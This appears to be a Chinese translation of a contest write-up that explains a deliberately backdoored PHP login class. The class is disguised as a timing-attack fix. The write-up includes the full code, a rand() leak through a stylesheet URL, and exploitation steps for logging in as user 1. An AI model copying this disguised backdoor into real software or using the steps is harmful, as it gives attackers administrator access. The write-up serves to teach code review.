# Web应用隐形后门的设计与实现

	> 原文地址：[https://stackoverflow.com/a/15494343/2224584](https://stackoverflow.com/a/15494343/2224584)

0x00 导言
=======

* * *

通俗地说，“后门”通常是计算机犯罪分子在首次攻陷系统之后留下的一个程序代码，以便于将来再次访问该系统。

但是，后门还可以是故意安插在软件项目中的安全漏洞，以便于攻击者将来通过它来控制你的系统。下面，我们就专门来讨论一下第二种情形。

本文将涉及许多具体代码，如果乍看看不明白也不要紧，可以直接跳过，我会随后对其进行详尽的介绍。

0x01 卑鄙密码竞赛
===========

* * *

继“卑鄙C程序大赛”之后，从2015开始，Defcon黑客大会又推出了“卑鄙密码竞赛”，以寻找和备案那些能够巧妙地颠覆加密代码的最好方法。在DEFCON 23大会上进行了两项赛事：

1.  GnuPG后门。
2.  口令认证后门。

我参加了第二项赛事，并最终获胜。 在本文中，我将介绍自己参赛作品的运行机制，如何让干邪恶勾当的代码看上去道貌岸然，以及这些对软件开发的直接影响。

0x02 如何重新设计口令认证后门
=================

* * *

首先，我们假设政府工作人员发现了本博主，并希望雇佣我去实现一个后门。

**第一步：杜撰一个非常棒的封面故事。**

就在DEFCON 23开会之前，密码专家Scott Contini刚刚发布了一篇介绍时序边信道攻击枚举用户帐户的文章，其工作原理如下所示：

1.  假设你想通过用户名与口令登录web应用。
2.  这个用户名是否已经注册？ 如果是，就继续。否则显示“bad username/password”。
3.  然后验证口令，实际上就是验证该口令的哈希值是否匹配。如果不匹配的话，就返回“bad username/password”。
4.  如果通过了第3步，那么这个用户就算是通过了认证。

站在攻击者的角度来看，令第二个步骤失效要比让第三个步骤失效更能节约时间。如这样做的话，即使其他部分牢不可破，攻击者仍然可以发送成批的请求来找出有效的用户名。

时序泄漏实际上就是后门的一座金矿，因为大部分程序员都不了解这一安全概念，而理解这一概念的信息安全专家又不是程序员。即使你编写的与加密有关的代码安全性非常差，大部分开发人员也不会看出什么门道，因为他们知道的并不比你更多。但如果我们这样做的话，比赛就会很无聊。

到目前为止，我们的总体规划是这样的：

1.  推荐一个解决方案，伪称可以解决基于时序攻击的账户枚举漏洞。
2.  然后在我们的解决方案中隐藏一个后门。
3.  同时要注意伪装，使其即使在普通的开发人员面前也不会因引起他们的警觉。

**第二步：设计阶段**

下面是TimingSafeAuth类的完整代码：

```
<?php

/**
 * A password_* wrapper that is proactively secure against user enumeration from
 * the timing difference between a valid user (which runs through the
 * password_verify() function) and an invalid user (which does not).
 */
class TimingSafeAuth
{
    private $db;
    public function __construct(\PDO $db)
    {
        $this->db = $db;
        $this->dummy_pw = password_hash(noise(), PASSWORD_DEFAULT);
    }

    /**
     * Authenticate a user without leaking valid usernames through timing
     * side-channels
     *
     * @param string $username
     * @param string $password
     * @return int|false
     */
    public function authenticate($username, $password)
    {
        $stmt = $this->db->prepare("SELECT * FROM users WHERE username = :username");
        if ($stmt->execute(['username' => $username])) {
            $row = $stmt->fetch(\PDO::FETCH_ASSOC);
            // Valid username
            if (password_verify($password, $row['password'])) {
                return $row['userid'];
            }
            return false;
        } else {
            // Returns false
            return password_verify($password, $this->dummy_pw);
        }
    }
}

```

当timingsafeauth类被实例化时，它会创建一个哑口令(dummy password) ，这是由于调用函数noise()（它改编自anchorcms，定义如下）所致：

```
/**
 * Generate a random string with our specific charset, which conforms to the
 * RFC 4648 standard for BASE32 encoding.
 *
 * @return string
 */
function noise()
{
    return substr(
        str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyz234567', 16)),
        0,
        32
    );
}

```

一定要记住这个noise()函数，因为它是后门的关键所在。

当我们实例化了所有登录脚本都需要的timingsafeauth对象之后，它最终会将一个用户名和密码传递给timingsafeauth -> authenticate()，这将执行一个数据库查询，然后执行下面两件事之一：

1.  如果用户名被发现，那么就验证提供的口令，方法是比较该用户相应文件的bcrypt哈希值进行匹配，具体要用到`password_verify()`函数。
2.  否则，利用提供的口令和伪造的bcrypt哈希值作为参数来调用`password_verify()`。

由于`$->dummy_pw`是随机生成的字符串的bcrypt哈希值，因此，我们总是希望上面的第二种选择失败而返回false，但这个过程总是需要花费大约相同的时间（从而隐藏时序侧信道），对吗？

0x03 藏在眼皮底下的漏洞
==============

* * *

好吧，最大的谎言就藏在这里：

```
// Returns false
return password_verify($password, $this->dummy_pw);

```

当然这个函数并不会总是返回false值，如果攻击者猜到了$this->dummy_pw里面的“哑口令”的话，它就能够返回true值了。正确的实现如下所示：

```
password_verify($password, $this->dummy_pw);
return false;

```

让我们假设审计人员在没有明确证据面前会对这段代码作出无罪推定。“如果我的哑口令是硬编码的话，肯定会引起别人的关注，但是这里它是随机生成的，因此它总能够避免引起别人的怀疑，对吧？”

不！ 因为从密码学的角度来看，`str_shuffle()`函数算不上安全的伪随机数发生器。要理解这一点，我们必须来考察一下`str_shuffle()`函数的PHP实现代码：

```
static void php_string_shuffle(char *str, zend_long len) /* {{{ */
{
    zend_long n_elems, rnd_idx, n_left;
    char temp;
    /* The implementation is stolen from array_data_shuffle       */
    /* Thus the characteristics of the randomization are the same */
    n_elems = len;

    if (n_elems <= 1) {
        return;
    }

    n_left = n_elems;

    while (--n_left) {
        rnd_idx = php_rand();
        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);
        if (rnd_idx != n_left) {
            temp = str[n_left];
            str[n_left] = str[rnd_idx];
            str[rnd_idx] = temp;
        }
    }
}

```

你注意到`rnd_idx = php_rand();`这一行了吗？ 对于rand()，是一个常见的线性同余随机数生成器，重要的是这种类型的随机数生成器是可破解的，具体可以参考[https://stackoverflow.com/a/15494343/2224584](https://stackoverflow.com/a/15494343/2224584)。

下面我们简单的回顾一下：

• 如果你猜中了哑口令，那么函数TimingSafeAuth->authenticate()就会返回true。 • 这个哑口令是由一个不安全的，并且是可预测的随机数生成器生成的，这个随机数生成器取自一个现实中的PHP项目。 • 只有那些非常熟悉密码学以及精通PHP的开发人员才会意识到这里隐藏的危险。

这个是有用的，但没有多少可利用性。在接下来的实现阶段，我们就会把这个故意设计的安全漏洞安插到我们的代码之中。

**第三步：实现后门**

我们的登录表单大致如下所示：

```
<?php
# This is all just preamble stuff, ignore it.
require_once dirname(__DIR__).'/autoload.php';
$pdo = new \PDO('sqlite:'. dirname(__DIR__) . '/database.sql');
session_start();

# Start here
if (!isset($_SESSION['userid'])) {
    # If you aren't currently logged in...
    if (!empty($_POST['csrf']) && !empty($_COOKIE['csrf'])) {
        # If you sent a CSRF token in the POST form data and a CSRF cookie
        if (hash_equals($_POST['csrf'], $_COOKIE['csrf'])) {
            # And they match (compared in constant time!), proceed
            $auth = new TimingSafeAuth($pdo);
            # Pass the given username and password to the authenticate() method.
            $userid = (int) $auth->authenticate($_POST['username'], $_POST['password']);
            # Take note of the type cast to (int).
            if ($userid) {
                // Success!
                $_SESSION['userid'] = $userid;
                header("Location: /");
                exit;
            }
        }
    }
    # This is the login form:
    require_once dirname(__DIR__).'/secret/login_form.php';
} else {
    # This is where you want to be:
    require_once dirname(__DIR__).'/secret/login_successful.php';
}

```

现在，我们来看最后一个代码块（`login_form_.PHP`，该代码用来给未授权的用户生成登录表单）：

```
<?php
if (!isset($_COOKIE['csrf'])) {
    # Remember this?
    $csrf = noise();
    setcookie('csrf', $csrf);
} else {
    $csrf = $_COOKIE['csrf'];
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Log In</title>
    <!-- # Below: We leak rand(); but that's totally benign, right? -->
    <link rel="stylesheet" href="/style.css?<?=rand(); ?>" type="text/css" /><?php /* cache-busting random query string */ ?>
</head>
<body>
<form method="post" action="/">
    <input type="hidden" name="csrf" value="<?=htmlentities($csrf, ENT_QUOTES | ENT_HTML5, 'UTF-8'); ?>" />
    <table>
        <tr>
            <td>
                <fieldset>
                    <legend>Username</legend>
                    <input type="text" name="username" required="required" />
                </fieldset>
            </td>
            <td>
                <fieldset>
                    <legend>Password</legend>
                    <input type="password" name="password" required="required" />
                </fieldset>
            </td>
        </tr>
        <tr>
            <td colsan="2">
                <button type="submit">
                    Log In
                </button>
            </td>
        </tr>
    </table>
</form>
</body>
</html>

```

这段代码主要就是生成一个完全正常的口令表单。它还包括基本的CSRF保护措施，也是由noise()来实现的。 每当你加载没有cookie的页面时，它都会由noise()生成的输出来作为一个新的CSRF cookie。

当然单靠这些我们就可以找出随机数生成程序的种子值并预测出哑口令，但是，我们还可以进一步通过样式查询字符串来泄露rand()的输出。 实际上，这个新的CSRF cookie对于在无需失败的登录尝试的条件下来判断noise()的预测是否成功非常有用。

你有没有注意到`$userid = (int) $auth->authenticate($_POST['username'], $_POST['password']);`这一行代码呢？ 它实际上就是我们后门中的另一行代码。当转换为整数的时候，PHP就会把true的值设置为1。在Web应用中，用户标识符取值较低的，通常都与管理账户有关。

0x04 利用方法
=========

* * *

将上面的所有信息综合起来，你就会发现实际上利用方法非常简单：

1.  向登录表单发送一些良性的请求，并且每次都要故意漏掉CSRF cookie，同时密切关注HTML中style.css后面的查询字符串。
2.  不要忘了你可以准确地预测下一个CSRF cookie，你可以将它作为随机选择的用户名的一个口令。需要注意的是，这个用户名必须足够随机，以确保它不是一个有效的用户名。
3.  最终会作为userid =1的用户登录。

0x05 这个后门给我们的提示是什么？
===================

* * *

*   不要火急火燎的让开发人员修补他们尚未完全弄明白的安全漏洞。
*   对于那些难题的新颖解决方案都应该通过专家进行仔细审查。
*   用户枚举是一个非常棘手的难题。在我看来，与其将力气花在解决用户枚举问题上面，还不如设法提高口令的安全性。口令管理程序能够带来更大的帮助！